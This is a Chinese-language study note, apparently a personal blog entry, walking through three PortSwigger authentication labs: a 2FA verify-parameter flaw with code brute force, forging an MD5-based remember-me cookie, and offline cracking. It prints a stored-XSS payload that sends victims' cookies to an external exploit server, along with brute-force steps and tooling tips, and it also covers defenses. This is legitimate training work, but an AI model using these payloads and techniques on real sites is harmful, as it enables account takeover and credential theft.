# 2026-08-13 PortSwigger 认证机制绕过实战（2FA 逻辑缺陷 / stay-logged-in Cookie 爆破 / 离线破解）

> 今天把 Authentication 系列连打三关：**2FA broken logic → Brute-forcing a stay-logged-in cookie → Offline password cracking**。三关正好是认证体系的三个层面：第二道门（2FA）、持久化凭据（remember-me）、凭据还原（离线破解）。配合 08-09《登录脆弱与认证缺陷》食用，认证这块的攻击面就基本齐了。

---

## 一、是什么（我的理解）

### 1.1 一句话

认证机制 = 服务端信任某样东西来证明"你是谁"。这三关分别演示了**信任的三种破裂方式**：信任了客户端可改的参数、信任了客户端可伪造的 cookie、信任了"偷不到"的假设。

| 关 | 漏洞本质 | 一句话 |
|----|---------|--------|
| 2FA broken logic | 逻辑缺陷 | 服务端用客户端传的 `verify` 参数决定"验证谁的码"，还让码可爆破 |
| Brute-forcing stay-logged-in | 设计缺陷 | remember-me cookie 里直接塞 `base64(用户名:md5(密码))`，可读可伪造 |
| Offline password cracking | 组合缺陷 | cookie 存密码哈希（设计缺陷）+ 评论区 XSS（泄露入口）→ 哈希离线秒破 |

### 1.2 关键认知：三类凭据的信任边界

```
登录密码   → 服务端校验，攻击者要"猜"
2FA 验证码 → 服务端校验，攻击者要"偷/爆"，且要绑对人   ← 这关 verify 没绑
remember-me cookie → 客户端保存、服务端验，结构可读可伪造 ← 这关存了哈希
```

记住一条：**凡是客户端手里能拿到的东西，默认都是可读、可改、可伪造的**。开发者以为"编码了就是安全"、"用户看不到"的假设，全是漏洞温床。

---

## 二、怎么产生的

1. **verify 参数客户端可控（Lab 8）**：登录后 2FA 流程里，服务端靠请求里的 `verify=wiener` 决定"当前在验证谁的码"。这个参数是客户端传的、没和会话强绑定 → 改成 `verify=carlos`，服务端就去生成/校验 carlos 的码。加上验证码接口无限流 → 四位码 10000 次可爆。
2. **remember-me cookie 存密码哈希（Lab 9、10）**：`stay-logged-in = base64(用户名:md5(密码))`。MD5 无盐且极快 → cookie 一旦泄露 = 密码哈希泄露 = 明文密码可离线还原；结构公开 → 不用偷也能伪造。
3. **XSS 是泄露入口（Lab 10）**：评论区输出没编码，注入 `<script>` 后受害者一浏览，浏览器主动把他的 cookie 送到攻击者服务器。XSS 在这里不是终点，是"搬运工"。

---

## 三、怎么利用（实操记录）

### 3.1 Lab 8：2FA broken logic（verify 参数可控 + 验证码爆破）

```
1. 用自己的 wiener:peter 登录，提交验证码时观察 POST /login2，发现 verify=wiener 参数
2. GET /login2 改 verify=carlos 发送 → 触发服务端给 carlos 生成验证码（我看不到，没关系）
3. 重新登录 wiener，随便提交一个错误验证码 → 停在验证码页，拿到可用 session
4. POST /login2：verify=carlos 固定，mfa-code 爆 0000-9999
5. 返回 302 的那次就是命中 → 加载响应进账户 → 过关
```

**踩的坑（重要）**：
- **Burp Community 版 Intruder 被官方限速**（约 1 req/s），线程拉满也没用，10000 次要挂几小时 → 换 Python 60 并发，2 分钟跑完
- 判定信号用状态码：失败 200、成功 302，很干净
- 四位码是 0000-9999，`seq -w 0 9999` 一行生成字典

### 3.2 Lab 9：Brute-forcing a stay-logged-in cookie（伪造 cookie 爆破）

**格式拆解**：`stay-logged-in` cookie = `base64(用户名:md5(密码))`，比如 `d2llbmVyOjUxZGMz...` 解码 = `wiener:51dc30ddc473d43a6011e9ebba6ca770`，`md5("peter")` 正好对上 → 结构确认。

**我的打法**：离线把 100 个候选密码全算成 `base64("carlos:"+md5(词))` 预生成 cookie 列表 → Intruder 直接导入爆破 → 返回 200 的那条命中 → 用它登录 carlos 过关。

**关键细节**：
- **请求里必须删掉自己的 session cookie，只留 stay-logged-in** —— 不然服务端优先认 session，永远返回你自己的账户页（全是 200，攻击失效）
- 官方做法是用 Intruder **Payload processing** 规则（`Hash: MD5 → Add prefix: carlos: → Encode: Base64-encode`）让 Burp 在请求时动态转换，payload 列表就是明文密码 —— 比我预生成文件优雅，**同一份字典换 prefix 就能打任何用户**
- 官方判定用 grep-match "Update email"（登录态才出现的按钮）——**业务特征比状态码可靠**

### 3.3 Lab 10：Offline password cracking（XSS 偷 cookie → 离线破解）

```
1. 登录 wiener 勾选 Stay logged in → 抓 cookie 解码 → 确认 base64(用户名:md5(密码)) 结构
2. 博客评论区注入存储型 XSS（用 exploit server 当接收点）：
   <script>document.location='//exploit-0aXXXX.exploit-server.net/'+document.cookie</script>
3. carlos 浏览评论 → XSS 触发 → 他的 cookie 拼在 URL 里发到 exploit server
4. Access log 里翻到 carlos 的 stay-logged-in cookie → 解码 = carlos:26323c16d5f4dabff3bb136f2460a943
5. 离线破解：md5 秒级可破（hashcat -m 0 或在线反查）→ 明文 onceuponatime
6. carlos + 明文登录 → My account → 删除账户 → 过关
```

**这关 exploit server 的角色和 XSS 专项 lab 相反**：XSS lab 里它是"发起点"（放恶意页面引诱访问）；这关它是"收件箱"（受害者不来访问你，是 XSS 主动把 cookie 送来，你去日志里翻）。

**我的思路 vs 官方路线**：我原计划偷到 cookie 直接用来登录（cookie 本身是有效凭证，不需要密码）；官方路线要求破解出明文密码再登录。两条都通，区别在目标：**cookie 直用 = 一次性会话接管；破解密码 = 长期资产**（密码会被复用、可横向移动）。lab 逼你走破解路线就是为了练 offline cracking 这步。

### 3.4 方法论沉淀（比过关更值钱）

1. **先验证后攻击**：爆破/伪造攻击前，先用自己的已知凭据端到端跑通一次（伪造 wiener 的 cookie 验证 == 服务器发的真 cookie），确认攻击链和判定信号没问题，再打目标
2. **用业务特征判命中**：找"只有登录成功才出现"的元素（按钮/用户名/文案）做 grep-match，别只看状态码——状态码会骗人（200 也可能渲染错误页）
3. **隔离凭据源**：测哪个凭据，请求里就只带哪个。混着带会掩盖服务器到底信任谁
4. **工具**：ffuf 单文件免安装、满并发，比 Burp CE 快几十倍；字典生成 `seq -w 0 9999`；Burp Payload processing 动态转换（hash/编码/拼接）

---

## 四、怎么防御

| 层面 | 措施 |
|------|------|
| remember-me | cookie 只放**随机 token**（服务端存映射），绝不放密码哈希或任何可派生值 |
| 密码存储 | bcrypt/argon2 + salt（慢哈希），MD5/SHA1 无盐一律不合格 |
| 2FA | 校验必须**绑定会话/用户**（verify 由服务端会话决定，不接受客户端传参）；验证码接口限流+失败锁定 |
| 登录态 | 会话和 remember-me 分 cookie、设 HttpOnly/Secure/SameSite |
| XSS | 评论区/用户输入回显必须输出编码（上下文相关编码），掐断凭据泄露入口 |
| 防御纵深 | 统一错误文案（防用户名枚举）、验证码与 IP+账号双重计数 |

---

## 五、我的总结 / 疑问

### 总结：认证漏洞的三步链

```
信息泄露（XSS / 不安全存储 / 日志）
   → 拿到凭据（cookie / hash / token）
   → 还原（离线破解）或直用（伪造/重放）→ 账户接管
```

认证类漏洞很少是单一弱点，基本都落在这条链上。审计时按链排查：**凭据从哪泄露 → 凭据结构可不可伪造 → 哈希能不能离线还原**。

### 在线 vs 离线

| 维度 | 在线（爆破登录/验证码） | 离线（破解 hash） |
|------|----------------------|------------------|
| 目标 | 一直打目标服务器 | 拿到数据后本地算，目标不知情 |
| 限制 | 限流/锁定/IP 封禁 | 只取决于 hash 强度 + 字典大小 |
| 速度 | 受网络和服务端限制 | MD5 几十亿次/秒 |

### 疑问

- remember-me 的"随机 token + 服务端存储"具体怎么实现？token 泄露后如何吊销？（想找 Spring Security RememberMe 源码对照）
- 2FA 校验正确的绑定粒度是什么：会话？用户？设备指纹？（这关只绑了 verify 参数，那绑 session 就够了吗）
- hashcat 除了 `-a 0` 字典模式，规则变形（`-r`）怎么用来打弱密码变形？

---

## 关联笔记

- [登录脆弱与认证缺陷](./2026-08-09-登录脆弱与认证缺陷.md) — 认证缺陷总览，今天的实战是它的靶场落地
- [Token 安全与防护绕过](./2026-08-10-Token安全与防护绕过.md) — 密钥爆破/算法混淆思路与"凭据可伪造"一脉相承
- [JWT 安全与攻击](./2026-08-12-JWT安全与攻击.md) — 同是"客户端凭据 + 服务端验"，信任边界错位的同款教训
- [XSS 跨站脚本攻击入门](./2026-08-02-XSS跨站脚本攻击入门.md) — 存储型 XSS 偷 cookie 的原理地基
- [验证码安全与绕过技术](./2026-08-10-验证码安全与绕过技术.md) — 验证码全生命周期漏洞，今天 2FA 爆破是它的实战版

## 待实践

- [ ] Authentication 剩余 4 关：2FA bypass using a brute-force attack / Password reset poisoning via middleware / Password brute-force via password change / Broken brute-force protection, multiple credentials per request
- [ ] 用 hashcat 规则（`-r`）对已知 hash 做变形攻击
- [ ] Turbo Intruder 学一下（Python 脚本化爆破，比 Intruder 灵活）
- [ ] 找 Spring Security RememberMe 源码，对照"随机 token + 服务端存储"的正确实现
- [ ] 把 ffuf 用熟：目录爆破/参数 fuzz/子域枚举三个场景各跑一遍

> ⚠️ 声明：以上技术仅用于 CTF 竞赛和授权靶场环境。
